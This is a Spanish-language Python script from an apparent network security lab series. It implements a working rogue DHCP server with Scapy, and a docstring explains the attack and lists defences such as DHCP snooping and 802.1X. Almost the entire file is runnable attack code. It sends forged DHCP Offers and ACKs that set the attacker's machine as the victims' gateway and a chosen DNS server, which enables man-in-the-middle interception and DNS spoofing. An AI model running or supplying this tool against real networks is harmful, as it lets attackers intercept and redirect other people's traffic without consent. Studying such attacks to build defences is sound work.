#!/usr/bin/env python3
"""
=============================================================================
LABORATORIO DE SEGURIDAD EN REDES - SCRIPT 03
Ataque: DHCP Spoofing (Servidor DHCP Falso / Rogue DHCP)
=============================================================================
DESCRIPCIÓN:
    Este script implementa un servidor DHCP falso (Rogue DHCP Server) que
    responde a solicitudes DHCP de clientes en la red antes que el servidor
    legítimo. El atacante asigna parámetros de red maliciosos:
    - Su propia IP como gateway por defecto → MitM automático
    - Servidores DNS maliciosos → DNS Spoofing / pharming
    - Lease time corto → clientes renuevan frecuentemente

CÓMO FUNCIONA:
    1. El atacante escucha mensajes DHCP Discover en broadcast.
    2. Al recibir un Discover, responde con un Offer falso ANTES que el
       servidor legítimo (mayor rapidez o flooding previo del legítimo).
    3. El cliente acepta la oferta más rápida y envía DHCP Request.
    4. El atacante confirma con DHCP ACK.
    5. El cliente obtiene configuración de red maliciosa.

REQUISITOS:
    - Python 3.8+
    - Scapy: pip install scapy
    - Permisos root
    - Estar en el mismo segmento de red (capa 2)

USO:
    sudo python3 03_dhcp_spoofing.py -i eth2 --pool 192.168.10.200-220 \
        --gateway 192.168.10.50 --dns 8.8.8.8 --netmask 255.255.255.0

PARÁMETROS:
    -i / --interface   : Interfaz de red
    --pool             : Rango de IPs a asignar (formato: X.X.X.X-Y)
    --gateway          : Gateway a anunciar (IP del atacante para MitM)
    --dns              : Servidor DNS a anunciar (puede ser malicioso)
    --netmask          : Máscara de subred
    --lease            : Tiempo de arrendamiento en segundos (default: 600)

CONTRA-MEDIDAS:
    - DHCP Snooping en switches: permite solo servidores DHCP en puertos
      de confianza (trusted ports) hacia el router legítimo.
    - 802.1X para autenticación de dispositivos antes de asignar red
    - DHCP Option 82 (Relay Information) para trazabilidad
    - Monitoreo con IPAM y alertas de nuevos servidores DHCP
    - Segmentación en VLANs con control estricto de puertos trunk
=============================================================================
"""

import argparse
import sys
import time
import ipaddress
from threading import Thread, Event

try:
    from scapy.all import (
        Ether, IP, UDP, BOOTP, DHCP,
        sniff, sendp, get_if_hwaddr, get_if_addr, conf
    )
except ImportError:
    print("[!] Scapy no está instalado. Ejecutar: pip install scapy")
    sys.exit(1)

# ─── Colores ─────────────────────────────────────────────────────────────────
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

def banner():
    print(f"""
{RED}{BOLD}
╔══════════════════════════════════════════════════════════════╗
║       DHCP SPOOFING (ROGUE SERVER) - LABORATORIO SEGURIDAD   ║
║               ¡SOLO PARA USO EDUCATIVO Y AUTORIZADO!         ║
╚══════════════════════════════════════════════════════════════╝
{RESET}""")

class RogueDHCPServer:
    """
    Servidor DHCP falso que responde a solicitudes legítimas de clientes.
    
    Mantiene un pool de IPs disponibles y un registro de asignaciones
    para evitar duplicados durante la sesión del ataque.
    """

    def __init__(self, interface: str, ip_pool: list, gateway: str,
                 dns: str, netmask: str, lease_time: int):
        self.interface  = interface
        self.ip_pool    = list(ip_pool)     # Pool de IPs disponibles
        self.ip_iter    = iter(self.ip_pool)
        self.gateway    = gateway
        self.dns        = dns
        self.netmask    = netmask
        self.lease_time = lease_time
        self.our_mac    = get_if_hwaddr(interface)
        self.our_ip     = get_if_addr(interface)
        self.leases     = {}  # mac → ip asignada
        self.stop_evt   = Event()
        self.served     = 0

    def _next_ip(self) -> str:
        """Obtiene la siguiente IP disponible del pool."""
        try:
            return next(self.ip_iter)
        except StopIteration:
            return None

    def _get_dhcp_type(self, pkt) -> int:
        """Extrae el tipo de mensaje DHCP del paquete."""
        for opt in pkt[DHCP].options:
            if opt[0] == 'message-type':
                return opt[1]
        return 0

    def _build_offer(self, pkt) -> bytes:
        """
        Construye un DHCP Offer en respuesta a un Discover.
        
        Asigna una IP del pool al cliente identificado por su MAC,
        incluyendo todos los parámetros de red maliciosos.
        """
        client_mac = pkt[Ether].src
        if client_mac in self.leases:
            offered_ip = self.leases[client_mac]
        else:
            offered_ip = self._next_ip()
            if not offered_ip:
                print(f"{YELLOW}[!] Pool de IPs agotado{RESET}")
                return None
            self.leases[client_mac] = offered_ip

        xid = pkt[BOOTP].xid

        offer = (
            Ether(src=self.our_mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src=self.our_ip, dst="255.255.255.255") /
            UDP(sport=67, dport=68) /
            BOOTP(
                op=2,           # Boot Reply
                yiaddr=offered_ip,   # IP ofrecida al cliente
                siaddr=self.our_ip,  # IP del servidor (atacante)
                giaddr="0.0.0.0",
                chaddr=bytes.fromhex(client_mac.replace(":", "")),
                xid=xid
            ) /
            DHCP(options=[
                ("message-type", "offer"),
                ("server_id", self.our_ip),
                ("lease_time", self.lease_time),
                ("subnet_mask", self.netmask),
                ("router", self.gateway),        # ← Gateway MALICIOSO
                ("name_server", self.dns),        # ← DNS MALICIOSO
                "end"
            ])
        )
        return offer

    def _build_ack(self, pkt) -> bytes:
        """
        Construye un DHCP ACK confirmando la asignación al cliente.
        
        Responde al DHCP Request del cliente con los mismos parámetros
        del Offer para completar el proceso de asignación.
        """
        client_mac = pkt[Ether].src
        offered_ip = self.leases.get(client_mac)
        if not offered_ip:
            return None

        xid = pkt[BOOTP].xid

        ack = (
            Ether(src=self.our_mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src=self.our_ip, dst="255.255.255.255") /
            UDP(sport=67, dport=68) /
            BOOTP(
                op=2,
                yiaddr=offered_ip,
                siaddr=self.our_ip,
                chaddr=bytes.fromhex(client_mac.replace(":", "")),
                xid=xid
            ) /
            DHCP(options=[
                ("message-type", "ack"),
                ("server_id", self.our_ip),
                ("lease_time", self.lease_time),
                ("subnet_mask", self.netmask),
                ("router", self.gateway),
                ("name_server", self.dns),
                "end"
            ])
        )
        return ack

    def process_packet(self, pkt):
        """
        Callback principal para procesar paquetes DHCP entrantes.
        
        Discrimina entre Discover (responde con Offer) y
        Request (responde con ACK).
        """
        if not pkt.haslayer(DHCP):
            return

        dhcp_type = self._get_dhcp_type(pkt)
        client_mac = pkt[Ether].src

        # Ignorar nuestros propios paquetes
        if client_mac == self.our_mac:
            return

        if dhcp_type == 1:  # DHCP Discover
            print(f"{CYAN}[→] DISCOVER de {client_mac}{RESET}")
            response = self._build_offer(pkt)
            if response:
                ip_ofrecida = self.leases.get(client_mac, "N/A")
                sendp(response, iface=self.interface, verbose=False)
                print(f"{GREEN}[←] OFFER enviado a {client_mac} → IP: {ip_ofrecida} | GW: {self.gateway} | DNS: {self.dns}{RESET}")

        elif dhcp_type == 3:  # DHCP Request
            print(f"{CYAN}[→] REQUEST de {client_mac}{RESET}")
            response = self._build_ack(pkt)
            if response:
                assigned_ip = self.leases.get(client_mac, "N/A")
                sendp(response, iface=self.interface, verbose=False)
                print(f"{GREEN}[✓] ACK enviado → {client_mac} recibió {assigned_ip}{RESET}")
                self.served += 1

    def start(self):
        """Inicia el servidor DHCP falso en modo escucha."""
        print(f"{GREEN}[+] Servidor DHCP Rogue activo:{RESET}")
        print(f"    Interfaz : {self.interface}")
        print(f"    Nuestra IP: {self.our_ip}")
        print(f"    Gateway anunciado : {self.gateway}")
        print(f"    DNS anunciado     : {self.dns}")
        print(f"    Pool disponible   : {len(self.ip_pool)} IPs")
        print(f"\n{YELLOW}[!] Escuchando solicitudes DHCP... (Ctrl+C para detener){RESET}\n")

        sniff(
            iface=self.interface,
            filter="udp and (port 67 or port 68)",
            prn=self.process_packet,
            store=False,
            stop_filter=lambda _: self.stop_evt.is_set()
        )

        print(f"\n{GREEN}[✓] Total de clientes comprometidos: {self.served}{RESET}")

def parse_pool(pool_str: str) -> list:
    """
    Parsea el rango de IPs del parámetro --pool.
    Formato: 192.168.1.200-220 o 192.168.1.200-192.168.1.220
    """
    try:
        if '-' in pool_str:
            parts = pool_str.split('-')
            base = parts[0]
            end_octet = int(parts[1]) if '.' not in parts[1] else int(parts[1].split('.')[-1])
            start_octet = int(base.split('.')[-1])
            prefix = '.'.join(base.split('.')[:3])
            return [f"{prefix}.{i}" for i in range(start_octet, end_octet + 1)]
    except:
        pass
    print(f"{RED}[!] Formato de pool inválido. Use: X.X.X.X-Y (ej: 192.168.1.200-220){RESET}")
    sys.exit(1)

def main():
    banner()
    parser = argparse.ArgumentParser(
        description="DHCP Spoofing Rogue Server - Laboratorio de Seguridad"
    )
    parser.add_argument("-i", "--interface", required=True)
    parser.add_argument("--pool", required=True,
                        help="Rango de IPs: ej 192.168.1.200-220")
    parser.add_argument("--gateway", required=True,
                        help="IP del gateway a anunciar (IP atacante para MitM)")
    parser.add_argument("--dns", default="8.8.8.8",
                        help="Servidor DNS a anunciar (default: 8.8.8.8)")
    parser.add_argument("--netmask", default="255.255.255.0")
    parser.add_argument("--lease", type=int, default=600,
                        help="Lease time en segundos (default: 600)")

    args = parser.parse_args()
    ip_pool = parse_pool(args.pool)

    server = RogueDHCPServer(
        interface=args.interface,
        ip_pool=ip_pool,
        gateway=args.gateway,
        dns=args.dns,
        netmask=args.netmask,
        lease_time=args.lease
    )

    try:
        server.start()
    except KeyboardInterrupt:
        server.stop_evt.set()
        print(f"\n{YELLOW}[*] Servidor DHCP Rogue detenido.{RESET}")

if __name__ == "__main__":
    main()
